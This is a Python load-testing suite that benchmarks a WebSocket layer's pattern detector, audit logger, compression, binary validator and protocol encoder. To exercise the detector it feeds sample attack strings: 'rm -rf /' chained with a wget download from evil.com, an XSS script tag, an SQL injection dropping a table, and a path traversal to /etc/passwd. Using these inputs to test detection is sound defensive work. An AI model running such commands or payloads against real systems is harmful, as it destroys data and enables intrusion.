"""Performance and load testing for WebSocket Communication Layer."""

import asyncio
import time
import json
import statistics
import psutil
import gc
from typing import Dict, Any, List, Tuple
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor
import structlog

logger = structlog.get_logger(__name__)


@dataclass
class PerformanceMetrics:
    """Performance metrics data structure."""
    test_name: str
    duration: float
    operations_per_second: float
    average_latency_ms: float
    p95_latency_ms: float
    p99_latency_ms: float
    memory_usage_mb: float
    cpu_usage_percent: float
    success_rate: float
    error_count: int
    total_operations: int


class PerformanceTestSuite:
    """Comprehensive performance testing suite for WebSocket components."""
    
    def __init__(self):
        self.results: List[PerformanceMetrics] = []
        self.process = psutil.Process()
    
    async def test_pattern_detection_performance(self, iterations: int = 1000):
        """Test pattern detection performance under load."""
        print(f"🎯 Testing Pattern Detection Performance ({iterations} iterations)...")
        
        from .pattern_detector import get_pattern_detector
        
        detector = get_pattern_detector()
        test_messages = [
            "normal terminal command: ls -la",
            "rm -rf / && wget http://evil.com/malware",
            "<script>alert('xss')</script>",
            "SELECT * FROM users WHERE id = 1; DROP TABLE users;",
            "cat ../../etc/passwd",
            "normal chat message hello world",
            "python script.py --help",
            "meterpreter > sessions -l"
        ] * (iterations // 8 + 1)
        
        start_time = time.time()
        start_memory = self.process.memory_info().rss / 1024 / 1024
        start_cpu = self.process.cpu_percent()
        
        latencies = []
        errors = 0
        
        for i, message in enumerate(test_messages[:iterations]):
            message_start = time.time()
            try:
                result = detector.analyze_message(message, f"perf_test_{i}", "test")
                message_end = time.time()
                latencies.append((message_end - message_start) * 1000)  # Convert to ms
            except Exception as e:
                errors += 1
                logger.error("Pattern detection error", error=str(e))
        
        end_time = time.time()
        end_memory = self.process.memory_info().rss / 1024 / 1024
        end_cpu = self.process.cpu_percent()
        
        duration = end_time - start_time
        ops_per_second = iterations / duration if duration > 0 else 0
        avg_latency = statistics.mean(latencies) if latencies else 0
        p95_latency = statistics.quantiles(latencies, n=20)[18] if len(latencies) >= 20 else avg_latency
        p99_latency = statistics.quantiles(latencies, n=100)[98] if len(latencies) >= 100 else avg_latency
        success_rate = ((iterations - errors) / iterations) * 100 if iterations > 0 else 0
        
        metrics = PerformanceMetrics(
            test_name="Pattern Detection",
            duration=duration,
            operations_per_second=ops_per_second,
            average_latency_ms=avg_latency,
            p95_latency_ms=p95_latency,
            p99_latency_ms=p99_latency,
            memory_usage_mb=end_memory - start_memory,
            cpu_usage_percent=end_cpu,
            success_rate=success_rate,
            error_count=errors,
            total_operations=iterations
        )
        
        self.results.append(metrics)
        self._print_metrics(metrics)
    
    async def test_audit_logging_performance(self, iterations: int = 1000):
        """Test audit logging performance under load."""
        print(f"📋 Testing Audit Logging Performance ({iterations} iterations)...")
        
        from .audit_logger import get_audit_logger, AuditEventType, AuditSeverity
        
        audit_logger = await get_audit_logger()
        
        start_time = time.time()
        start_memory = self.process.memory_info().rss / 1024 / 1024
        
        latencies = []
        errors = 0
        
        for i in range(iterations):
            event_start = time.time()
            try:
                await audit_logger.log_event(
                    AuditEventType.MESSAGE_RECEIVED,
                    AuditSeverity.INFO,
                    connection_id=f"perf_test_{i}",
                    user_id=f"user_{i % 100}",
                    message_type="terminal_data",
                    message_size=1024,
                    details={"test_iteration": i}
                )
                event_end = time.time()
                latencies.append((event_end - event_start) * 1000)
            except Exception as e:
                errors += 1
                logger.error("Audit logging error", error=str(e))
        
        # Wait for background processing
        await asyncio.sleep(1)
        
        end_time = time.time()
        end_memory = self.process.memory_info().rss / 1024 / 1024
        
        duration = end_time - start_time
        ops_per_second = iterations / duration if duration > 0 else 0
        avg_latency = statistics.mean(latencies) if latencies else 0
        p95_latency = statistics.quantiles(latencies, n=20)[18] if len(latencies) >= 20 else avg_latency
        p99_latency = statistics.quantiles(latencies, n=100)[98] if len(latencies) >= 100 else avg_latency
        success_rate = ((iterations - errors) / iterations) * 100 if iterations > 0 else 0
        
        metrics = PerformanceMetrics(
            test_name="Audit Logging",
            duration=duration,
            operations_per_second=ops_per_second,
            average_latency_ms=avg_latency,
            p95_latency_ms=p95_latency,
            p99_latency_ms=p99_latency,
            memory_usage_mb=end_memory - start_memory,
            cpu_usage_percent=self.process.cpu_percent(),
            success_rate=success_rate,
            error_count=errors,
            total_operations=iterations
        )
        
        self.results.append(metrics)
        self._print_metrics(metrics)
    
    async def test_compression_performance(self, iterations: int = 500):
        """Test message compression performance."""
        print(f"🗜️  Testing Compression Performance ({iterations} iterations)...")
        
        from .compression import get_message_compressor, CompressionAlgorithm
        
        compressor = get_message_compressor()
        
        # Test with various message sizes
        test_messages = [
            {"type": "small", "data": "A" * 100},  # 100 bytes
            {"type": "medium", "data": "B" * 1000},  # 1KB
            {"type": "large", "data": "C" * 10000},  # 10KB
            {"type": "huge", "data": "D" * 50000},  # 50KB
        ]
        
        start_time = time.time()
        start_memory = self.process.memory_info().rss / 1024 / 1024
        
        latencies = []
        errors = 0
        total_compression_ratio = 0
        
        for i in range(iterations):
            message = test_messages[i % len(test_messages)]
            compress_start = time.time()
            
            try:
                result = compressor.compress_message(message, CompressionAlgorithm.GZIP)
                compress_end = time.time()
                
                latencies.append((compress_end - compress_start) * 1000)
                
                # Test decompression
                if hasattr(result, 'compressed_envelope'):
                    decompressed = compressor.extract_compressed_message(result.compressed_envelope)
                    if hasattr(result, 'compression_ratio'):
                        total_compression_ratio += result.compression_ratio
                
            except Exception as e:
                errors += 1
                logger.error("Compression error", error=str(e))
        
        end_time = time.time()
        end_memory = self.process.memory_info().rss / 1024 / 1024
        
        duration = end_time - start_time
        ops_per_second = iterations / duration if duration > 0 else 0
        avg_latency = statistics.mean(latencies) if latencies else 0
        p95_latency = statistics.quantiles(latencies, n=20)[18] if len(latencies) >= 20 else avg_latency
        p99_latency = statistics.quantiles(latencies, n=100)[98] if len(latencies) >= 100 else avg_latency
        success_rate = ((iterations - errors) / iterations) * 100 if iterations > 0 else 0
        avg_compression_ratio = total_compression_ratio / max(1, iterations - errors)
        
        metrics = PerformanceMetrics(
            test_name="Message Compression",
            duration=duration,
            operations_per_second=ops_per_second,
            average_latency_ms=avg_latency,
            p95_latency_ms=p95_latency,
            p99_latency_ms=p99_latency,
            memory_usage_mb=end_memory - start_memory,
            cpu_usage_percent=self.process.cpu_percent(),
            success_rate=success_rate,
            error_count=errors,
            total_operations=iterations
        )
        
        self.results.append(metrics)
        self._print_metrics(metrics)
        print(f"   Average Compression Ratio: {avg_compression_ratio:.1%}")
    
    async def test_binary_validation_performance(self, iterations: int = 1000):
        """Test binary data validation performance."""
        print(f"📦 Testing Binary Validation Performance ({iterations} iterations)...")
        
        from .binary_validator import get_binary_validator, BinaryFormat
        
        validator = await get_binary_validator()
        
        # Test with various binary data types
        test_data = [
            b"Normal terminal output data",
            b"Binary data with \x00\x01\x02\x03 sequences",
            b"A" * 1000,  # 1KB of data
            b"Mixed data: Hello \xff\xfe world \x90\x90",
            b"Large data: " + b"X" * 10000,  # 10KB
        ]
        
        start_time = time.time()
        start_memory = self.process.memory_info().rss / 1024 / 1024
        
        latencies = []
        errors = 0
        
        for i in range(iterations):
            data = test_data[i % len(test_data)]
            validate_start = time.time()
            
            try:
                result = await validator.validate_binary_data(
                    data, 
                    BinaryFormat.RAW_BYTES, 
                    f"perf_test_{i}"
                )
                validate_end = time.time()
                latencies.append((validate_end - validate_start) * 1000)
            except Exception as e:
                errors += 1
                logger.error("Binary validation error", error=str(e))
        
        end_time = time.time()
        end_memory = self.process.memory_info().rss / 1024 / 1024
        
        duration = end_time - start_time
        ops_per_second = iterations / duration if duration > 0 else 0
        avg_latency = statistics.mean(latencies) if latencies else 0
        p95_latency = statistics.quantiles(latencies, n=20)[18] if len(latencies) >= 20 else avg_latency
        p99_latency = statistics.quantiles(latencies, n=100)[98] if len(latencies) >= 100 else avg_latency
        success_rate = ((iterations - errors) / iterations) * 100 if iterations > 0 else 0
        
        metrics = PerformanceMetrics(
            test_name="Binary Validation",
            duration=duration,
            operations_per_second=ops_per_second,
            average_latency_ms=avg_latency,
            p95_latency_ms=p95_latency,
            p99_latency_ms=p99_latency,
            memory_usage_mb=end_memory - start_memory,
            cpu_usage_percent=self.process.cpu_percent(),
            success_rate=success_rate,
            error_count=errors,
            total_operations=iterations
        )
        
        self.results.append(metrics)
        self._print_metrics(metrics)
    
    async def test_protocol_encoding_performance(self, iterations: int = 2000):
        """Test protocol message encoding/decoding performance."""
        print(f"📡 Testing Protocol Encoding Performance ({iterations} iterations)...")
        
        from .protocols import MessageProtocol, MessageType
        
        protocol = MessageProtocol()
        
        start_time = time.time()
        start_memory = self.process.memory_info().rss / 1024 / 1024
        
        latencies = []
        errors = 0
        
        for i in range(iterations):
            encode_start = time.time()
            
            try:
                # Test encoding
                test_data = {"message": f"Test message {i}", "timestamp": time.time()}
                encoded = protocol.encode_message(
                    MessageType.TERMINAL_DATA, 
                    test_data,
                    require_protocol=False
                )
                
                # Test decoding
                decoded = protocol.decode_message(encoded)
                
                encode_end = time.time()
                latencies.append((encode_end - encode_start) * 1000)
                
            except Exception as e:
                errors += 1
                logger.error("Protocol encoding error", error=str(e))
        
        end_time = time.time()
        end_memory = self.process.memory_info().rss / 1024 / 1024
        
        duration = end_time - start_time
        ops_per_second = iterations / duration if duration > 0 else 0
        avg_latency = statistics.mean(latencies) if latencies else 0
        p95_latency = statistics.quantiles(latencies, n=20)[18] if len(latencies) >= 20 else avg_latency
        p99_latency = statistics.quantiles(latencies, n=100)[98] if len(latencies) >= 100 else avg_latency
        success_rate = ((iterations - errors) / iterations) * 100 if iterations > 0 else 0
        
        metrics = PerformanceMetrics(
            test_name="Protocol Encoding",
            duration=duration,
            operations_per_second=ops_per_second,
            average_latency_ms=avg_latency,
            p95_latency_ms=p95_latency,
            p99_latency_ms=p99_latency,
            memory_usage_mb=end_memory - start_memory,
            cpu_usage_percent=self.process.cpu_percent(),
            success_rate=success_rate,
            error_count=errors,
            total_operations=iterations
        )
        
        self.results.append(metrics)
        self._print_metrics(metrics)
    
    async def test_concurrent_operations(self, concurrent_tasks: int = 50, operations_per_task: int = 100):
        """Test concurrent operations performance."""
        print(f"🚀 Testing Concurrent Operations ({concurrent_tasks} tasks × {operations_per_task} ops)...")
        
        from .pattern_detector import get_pattern_detector
        
        detector = get_pattern_detector()
        
        async def worker_task(task_id: int):
            """Worker task for concurrent testing."""
            latencies = []
            errors = 0
            
            for i in range(operations_per_task):
                start = time.time()
                try:
                    message = f"Task {task_id} message {i}: ls -la"
                    result = detector.analyze_message(message, f"concurrent_{task_id}_{i}", "test")
                    end = time.time()
                    latencies.append((end - start) * 1000)
                except Exception as e:
                    errors += 1
            
            return latencies, errors
        
        start_time = time.time()
        start_memory = self.process.memory_info().rss / 1024 / 1024
        
        # Run concurrent tasks
        tasks = [worker_task(i) for i in range(concurrent_tasks)]
        results = await asyncio.gather(*tasks)
        
        end_time = time.time()
        end_memory = self.process.memory_info().rss / 1024 / 1024
        
        # Aggregate results
        all_latencies = []
        total_errors = 0
        
        for latencies, errors in results:
            all_latencies.extend(latencies)
            total_errors += errors
        
        total_operations = concurrent_tasks * operations_per_task
        duration = end_time - start_time
        ops_per_second = total_operations / duration if duration > 0 else 0
        avg_latency = statistics.mean(all_latencies) if all_latencies else 0
        p95_latency = statistics.quantiles(all_latencies, n=20)[18] if len(all_latencies) >= 20 else avg_latency
        p99_latency = statistics.quantiles(all_latencies, n=100)[98] if len(all_latencies) >= 100 else avg_latency
        success_rate = ((total_operations - total_errors) / total_operations) * 100 if total_operations > 0 else 0
        
        metrics = PerformanceMetrics(
            test_name="Concurrent Operations",
            duration=duration,
            operations_per_second=ops_per_second,
            average_latency_ms=avg_latency,
            p95_latency_ms=p95_latency,
            p99_latency_ms=p99_latency,
            memory_usage_mb=end_memory - start_memory,
            cpu_usage_percent=self.process.cpu_percent(),
            success_rate=success_rate,
            error_count=total_errors,
            total_operations=total_operations
        )
        
        self.results.append(metrics)
        self._print_metrics(metrics)
    
    async def test_memory_usage_patterns(self, duration_seconds: int = 30):
        """Test memory usage patterns over time."""
        print(f"💾 Testing Memory Usage Patterns ({duration_seconds}s)...")
        
        from .pattern_detector import get_pattern_detector
        from .audit_logger import get_audit_logger, AuditEventType, AuditSeverity
        
        detector = get_pattern_detector()
        audit_logger = await get_audit_logger()
        
        start_time = time.time()
        memory_samples = []
        operations = 0
        
        while time.time() - start_time < duration_seconds:
            # Perform various operations
            detector.analyze_message("test message", f"mem_test_{operations}", "test")
            
            await audit_logger.log_event(
                AuditEventType.MESSAGE_RECEIVED,
                AuditSeverity.INFO,
                connection_id=f"mem_test_{operations}",
                details={"memory_test": True}
            )
            
            operations += 1
            
            # Sample memory every second
            if operations % 10 == 0:  # Reduce sampling frequency
                memory_usage = self.process.memory_info().rss / 1024 / 1024
                memory_samples.append(memory_usage)
                await asyncio.sleep(0.1)
        
        end_time = time.time()
        
        # Calculate memory statistics
        if memory_samples:
            avg_memory = statistics.mean(memory_samples)
            peak_memory = max(memory_samples)
            min_memory = min(memory_samples)
            memory_growth = memory_samples[-1] - memory_samples[0] if len(memory_samples) > 1 else 0
        else:
            avg_memory = peak_memory = min_memory = memory_growth = 0
        
        duration = end_time - start_time
        ops_per_second = operations / duration if duration > 0 else 0
        
        print(f"   Operations: {operations}")
        print(f"   Ops/sec: {ops_per_second:.1f}")
        print(f"   Average Memory: {avg_memory:.1f} MB")
        print(f"   Peak Memory: {peak_memory:.1f} MB")
        print(f"   Memory Growth: {memory_growth:+.1f} MB")
        
        # Check for memory leaks
        if memory_growth > 50:  # More than 50MB growth
            print(f"   ⚠️  Potential memory leak detected: {memory_growth:.1f} MB growth")
        else:
            print(f"   ✅ Memory usage stable: {memory_growth:+.1f} MB growth")
    
    def _print_metrics(self, metrics: PerformanceMetrics):
        """Print performance metrics in a readable format."""
        print(f"   Duration: {metrics.duration:.2f}s")
        print(f"   Operations/sec: {metrics.operations_per_second:.1f}")
        print(f"   Avg Latency: {metrics.average_latency_ms:.2f}ms")
        print(f"   P95 Latency: {metrics.p95_latency_ms:.2f}ms")
        print(f"   P99 Latency: {metrics.p99_latency_ms:.2f}ms")
        print(f"   Memory Usage: {metrics.memory_usage_mb:+.1f} MB")
        print(f"   Success Rate: {metrics.success_rate:.1f}%")
        if metrics.error_count > 0:
            print(f"   Errors: {metrics.error_count}")
    
    async def run_all_tests(self):
        """Run all performance tests."""
        print("🚀 Starting WebSocket Performance Testing Suite")
        print("=" * 60)
        
        start_time = time.time()
        
        # Run all performance tests
        await self.test_pattern_detection_performance(1000)
        await self.test_audit_logging_performance(500)  # Reduced for performance
        await self.test_compression_performance(200)  # Reduced for performance
        await self.test_binary_validation_performance(500)
        await self.test_protocol_encoding_performance(1000)
        await self.test_concurrent_operations(20, 50)  # Reduced for stability
        await self.test_memory_usage_patterns(15)  # Reduced duration
        
        # Force garbage collection
        gc.collect()
        
        end_time = time.time()
        total_duration = end_time - start_time
        
        # Generate performance report
        self.generate_performance_report(total_duration)
    
    def generate_performance_report(self, total_duration: float):
        """Generate comprehensive performance report."""
        print("\n" + "=" * 60)
        print("🚀 PERFORMANCE TEST REPORT")
        print("=" * 60)
        
        if not self.results:
            print("❌ No performance results to report")
            return
        
        # Calculate overall statistics
        total_operations = sum(m.total_operations for m in self.results)
        avg_ops_per_second = statistics.mean([m.operations_per_second for m in self.results])
        avg_latency = statistics.mean([m.average_latency_ms for m in self.results])
        avg_success_rate = statistics.mean([m.success_rate for m in self.results])
        total_errors = sum(m.error_count for m in self.results)
        
        print(f"📊 Overall Performance Summary:")
        print(f"   Test Duration: {total_duration:.1f}s")
        print(f"   Total Operations: {total_operations:,}")
        print(f"   Average Ops/sec: {avg_ops_per_second:.1f}")
        print(f"   Average Latency: {avg_latency:.2f}ms")
        print(f"   Overall Success Rate: {avg_success_rate:.1f}%")
        print(f"   Total Errors: {total_errors}")
        
        # Performance grade
        if avg_ops_per_second >= 1000 and avg_latency <= 10 and avg_success_rate >= 99:
            grade = "A+ (Excellent)"
            emoji = "🚀"
        elif avg_ops_per_second >= 500 and avg_latency <= 50 and avg_success_rate >= 95:
            grade = "A (Very Good)"
            emoji = "⚡"
        elif avg_ops_per_second >= 100 and avg_latency <= 100 and avg_success_rate >= 90:
            grade = "B (Good)"
            emoji = "✅"
        elif avg_ops_per_second >= 50 and avg_latency <= 200 and avg_success_rate >= 80:
            grade = "C (Adequate)"
            emoji = "⚠️"
        else:
            grade = "D (Needs Improvement)"
            emoji = "🔧"
        
        print(f"\n{emoji} Performance Grade: {grade}")
        
        # Detailed results by test
        print(f"\n📋 Detailed Test Results:")
        for metrics in self.results:
            status_emoji = "✅" if metrics.success_rate >= 95 else "⚠️" if metrics.success_rate >= 80 else "❌"
            print(f"   {status_emoji} {metrics.test_name}:")
            print(f"      Ops/sec: {metrics.operations_per_second:.1f}")
            print(f"      Latency: {metrics.average_latency_ms:.2f}ms (avg), {metrics.p99_latency_ms:.2f}ms (p99)")
            print(f"      Success: {metrics.success_rate:.1f}%")
        
        # Performance recommendations
        print(f"\n🎯 Performance Recommendations:")
        
        slow_tests = [m for m in self.results if m.operations_per_second < 100]
        if slow_tests:
            print(f"   ⚠️  Optimize slow components: {[t.test_name for t in slow_tests]}")
        
        high_latency_tests = [m for m in self.results if m.p99_latency_ms > 100]
        if high_latency_tests:
            print(f"   ⚠️  Reduce latency in: {[t.test_name for t in high_latency_tests]}")
        
        error_tests = [m for m in self.results if m.error_count > 0]
        if error_tests:
            print(f"   ❌ Fix errors in: {[t.test_name for t in error_tests]}")
        
        if not slow_tests and not high_latency_tests and not error_tests:
            print("   ✅ All components performing well - ready for production!")
        
        # Production readiness assessment
        print(f"\n🏭 Production Readiness:")
        if avg_ops_per_second >= 500 and avg_latency <= 50 and avg_success_rate >= 99:
            print("   ✅ READY - Excellent performance for production deployment")
        elif avg_ops_per_second >= 100 and avg_latency <= 100 and avg_success_rate >= 95:
            print("   ✅ READY - Good performance for production deployment")
        elif avg_ops_per_second >= 50 and avg_latency <= 200 and avg_success_rate >= 90:
            print("   ⚠️  CAUTION - Monitor closely in production")
        else:
            print("   ❌ NOT READY - Performance optimization required")
        
        # Save detailed report
        self.save_performance_report(total_duration, avg_ops_per_second, avg_latency, grade)
        print(f"\n📄 Detailed report saved to: websocket_performance_report.json")
        print("=" * 60)
    
    def save_performance_report(self, total_duration: float, avg_ops_per_second: float, 
                              avg_latency: float, grade: str):
        """Save detailed performance report to file."""
        report = {
            "test_suite": "WebSocket Performance Testing",
            "version": "1.2.0",
            "timestamp": time.time(),
            "summary": {
                "total_duration_seconds": total_duration,
                "average_operations_per_second": avg_ops_per_second,
                "average_latency_ms": avg_latency,
                "performance_grade": grade,
                "total_operations": sum(m.total_operations for m in self.results),
                "total_errors": sum(m.error_count for m in self.results)
            },
            "detailed_results": [
                {
                    "test_name": m.test_name,
                    "duration": m.duration,
                    "operations_per_second": m.operations_per_second,
                    "average_latency_ms": m.average_latency_ms,
                    "p95_latency_ms": m.p95_latency_ms,
                    "p99_latency_ms": m.p99_latency_ms,
                    "memory_usage_mb": m.memory_usage_mb,
                    "cpu_usage_percent": m.cpu_usage_percent,
                    "success_rate": m.success_rate,
                    "error_count": m.error_count,
                    "total_operations": m.total_operations
                }
                for m in self.results
            ],
            "system_info": {
                "cpu_count": psutil.cpu_count(),
                "memory_total_gb": psutil.virtual_memory().total / (1024**3),
                "python_version": f"{psutil.sys.version_info.major}.{psutil.sys.version_info.minor}"
            }
        }
        
        with open("websocket_performance_report.json", "w") as f:
            json.dump(report, f, indent=2)


async def run_performance_tests():
    """Main function to run performance tests."""
    test_suite = PerformanceTestSuite()
    await test_suite.run_all_tests()
    return test_suite.results


if __name__ == "__main__":
    asyncio.run(run_performance_tests())